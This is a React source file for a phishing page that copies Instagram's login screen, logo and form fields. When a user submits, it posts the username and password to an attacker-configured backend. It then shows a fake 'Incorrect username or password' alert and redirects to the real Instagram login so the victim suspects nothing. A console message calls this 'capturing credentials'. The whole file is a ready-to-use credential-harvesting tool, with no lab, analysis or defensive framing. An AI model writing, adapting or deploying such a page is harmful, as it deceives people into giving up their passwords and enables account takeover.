import React, { useState } from "react";
import axios from "axios";
import "./App.css";

function App() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false); 

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true); // Start loading
    try {
      await axios.post(`${import.meta.env.VITE_BACKEND}/api/login`, {
        username,
        password,
      });

      alert("Incorrect username or password");
      window.location.href = "https://www.instagram.com/accounts/login/";
    } catch (err) {
      console.error("Error capturing credentials", err);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="container">
      <div className="login-box">
        <img
          src="https://1000logos.net/wp-content/uploads/2017/02/Instagram-Logo.png"
          alt="Instagram"
          className="logo"
        />
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button type="submit" disabled={isLoading}>
            {isLoading ? "Logging in..." : "Log In"}
          </button>
        </form>

        {isLoading && (
          <div className="loading">
            <img
              src="https://i.gifer.com/ZZ5H.gif"
              alt="Loading..."
              width="40"
              height="40"
            />
          </div>
        )}

        <p className="forgot">Forgot password?</p>
      </div>
    </div>
  );
}

export default App;
